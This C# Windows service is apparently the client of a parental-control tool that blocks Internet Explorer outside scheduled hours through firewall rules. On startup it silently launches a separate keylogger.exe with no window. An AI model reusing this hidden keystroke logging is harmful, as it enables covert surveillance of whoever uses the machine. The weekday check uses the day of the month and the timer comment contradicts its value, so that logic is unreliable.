using EGuardClientService.Framework;
using System.ServiceProcess;
using System.Text;
using System.Timers;
using NetFwTypeLib;
using System;
using System.Linq;
using System.Collections;
using System.Diagnostics;

namespace EGuardClientService
{
    /// <summary>
    /// The actual implementation of the windows service goes here...
    /// </summary>
    [WindowsService("EGuardClientService",
        DisplayName = "EGuardClientService",
        Description = "The description of the EGuardClientService service.",
        EventLogSource = "EGuardClientService",
        StartMode = ServiceStartMode.Automatic)]
    public class ServiceImplementation : IWindowsService
    {
        // Timer to verify if start time has been reached periodically
        private static System.Timers.Timer aTimer;

        // Keylogger process
        private static Process myKeylogger;

        /// <summary>
        /// Performs application-defined tasks associated with freeing, releasing, or resetting unmanaged resources.
        /// </summary>
        /// <filterpriority>2</filterpriority>
        public void Dispose()
        {
        }

        /// <summary>
        /// This method is called when the service gets a request to start.
        /// </summary>
        /// <param name="args">Any command line arguments</param>
        public void OnStart(string[] args)
        {

            myKeylogger = new Process();

            try
            {
                myKeylogger.StartInfo.UseShellExecute = false;
                // start keylogger process
                myKeylogger.StartInfo.FileName = "keylogger.exe";
                myKeylogger.StartInfo.CreateNoWindow = true;
                myKeylogger.Start();
                // This code assumes the process you are starting will terminate itself.  
                // Given that is is started without a window so you cannot terminate it  
                // on the desktop, it must terminate itself or you can do it programmatically 
                // from this application using the Kill method.
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
                                  
            
            //initialize keylogger
            //Process.Start("keylogger.exe");

            // Enable firewall
            Type NetFwMgrType = Type.GetTypeFromProgID("HNetCfg.FwMgr", false);
            INetFwMgr mgr = (INetFwMgr)Activator.CreateInstance(NetFwMgrType);

            bool Firewallenabled = mgr.LocalPolicy.CurrentProfile.FirewallEnabled;
            mgr.LocalPolicy.CurrentProfile.FirewallEnabled = true;

            // Create Windows Firewall rule to block Internet Explorer if it does not exist

            Type NetFwPolicy2Type = Type.GetTypeFromProgID("HNetCfg.FwPolicy2", false);
            INetFwPolicy2 policy2 = (INetFwPolicy2)Activator.CreateInstance(NetFwPolicy2Type);

            INetFwRules rules = policy2.Rules;
            int profiles = policy2.CurrentProfileTypes;
            Boolean createRule = true;
            INetFwRule currentRule;

            IEnumerator ruleEnumerator;
            ruleEnumerator = rules.GetEnumerator();
            while (ruleEnumerator.MoveNext() != false)
            {
                currentRule = (INetFwRule)ruleEnumerator.Current;
                if ( currentRule.Name == "Internet Explorer block rule")
                {
                    createRule = false;
                }

            }
           
            if (createRule)
            {
                // Create a Rule Object.
                Type NetFwRule = Type.GetTypeFromProgID("HNetCfg.FWRule", false);
                INetFwRule rule = (INetFwRule)Activator.CreateInstance(NetFwRule);

                rule.Name = "Internet Explorer block rule";
                rule.Description = "Block IExplore network traffic";
                rule.ApplicationName = "%ProgramFiles% (x86)\\Internet Explorer\\iexplore.exe";
                rule.Direction = NetFwTypeLib.NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT; // NET_FW_RULE_DIR_OUT
                rule.Enabled = false;
                rule.Action = 0; // NET_FW_ACTION_BLOCK

                // Add a new rule
                rules.Add(rule);
            }
            
            // Create a timer with a sixty second interval.
            aTimer = new System.Timers.Timer(60000);

            // Hook up the Elapsed event for the timer.
            aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);

            // Set the Interval to 2 seconds (20000 milliseconds).
            aTimer.Interval = 20000;
            aTimer.Enabled = true;

        }

        /// <summary>
        /// This method is called when the service gets a request to stop.
        /// </summary>
        public void OnStop()
        {
            // Kill keylogger process.
            myKeylogger.Kill();
        }

        /// <summary>
        /// This method is called when a service gets a request to pause, 
        /// but not stop completely.
        /// </summary>
        public void OnPause()
        {
        }

        /// <summary>
        /// This method is called when a service gets a request to resume 
        /// after a pause is issued.
        /// </summary>
        public void OnContinue()
        {
        }

        /// <summary>
        /// This method is called when the machine the service is running on
        /// is being shutdown.
        /// </summary>
        public void OnShutdown()
        {
        }

        /// <summary>
        /// This method is called when a custom command is issued to the service.
        /// </summary>
        /// <param name="command">The command identifier to execute.</param >
        public void OnCustomCommand(int command)
        {
        }

        // Specify what you want to happen when the Elapsed event is  
        // raised. 
        private static void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            string fileName = "TimeControlSettings.txt";
            string sourcePath = @".\";
            string targetPath = @"C:\Temp";

            // Use Path class to manipulate file and directory paths. 
            string sourceFile = System.IO.Path.Combine(sourcePath, fileName);
            string destFile = System.IO.Path.Combine(targetPath, fileName);

            // To copy a folder's contents to a new location: 
            // Create a new target folder, if necessary. 
            if (!System.IO.Directory.Exists(targetPath))
            {
                System.IO.Directory.CreateDirectory(targetPath);

                if (!System.IO.File.Exists(destFile))
                {
                    // To copy a file to another location and  
                    // overwrite the destination file if it already exists.
                    System.IO.File.Copy(sourceFile, destFile, true);
                }
            }       
                     
            // Variables used to store the contents of the time control settings file
            String startEndTimesFromFile;
            String daysOfWeekFromFile;

            // Get Windows Firewall rules
            Type NetFwPolicy2Type = Type.GetTypeFromProgID("HNetCfg.FwPolicy2", false);
            INetFwPolicy2 policy2 = (INetFwPolicy2)Activator.CreateInstance(NetFwPolicy2Type);
            INetFwRules rules = policy2.Rules;
            int profiles = policy2.CurrentProfileTypes;            
            
            // Read the file and display it line by line.
            System.IO.StreamReader file =
                new System.IO.StreamReader(destFile); 

            startEndTimesFromFile = file.ReadLine();
            daysOfWeekFromFile = file.ReadLine();

            // Close file
            file.Close();

            String[] startEndTime = startEndTimesFromFile.Split(new char[] { ',' });
            String[] daysOfWeek = daysOfWeekFromFile.Split(new char[] { ',' });


            // Get the date and time for the current moment, adjusted  
            // to the local time zone.
            DateTime saveNow = DateTime.Now;
            if (saveNow.Hour >= Convert.ToInt32(startEndTime[0]) &&
                 saveNow.Hour < Convert.ToInt32(startEndTime[1]) &&
                    daysOfWeek.Contains(((saveNow.Day + 5) % 7).ToString()))
            //  (startEndTime[2] == (saveNow.DayOfWeek.ToString())                
            {
                if (rules.Item("Internet Explorer block rule").Enabled)
                {
                    // Disable block rule since we are within the allowed period 
                    //  defined by time control settings 
                    rules.Item("Internet Explorer block rule").Enabled = false;
                }
                else
                {
                    // Do nothing 
                }
            }
            else
            {
                if (rules.Item("Internet Explorer block rule").Enabled)
                {
                    // Do nothing
                }
                else
                {
                    // Enable rule to block Internet Explorer
                    rules.Item("Internet Explorer block rule").Enabled = true;
                }
            }
            Console.WriteLine("The Elapsed event was raised at {0}", e.SignalTime);
        }

    }
}
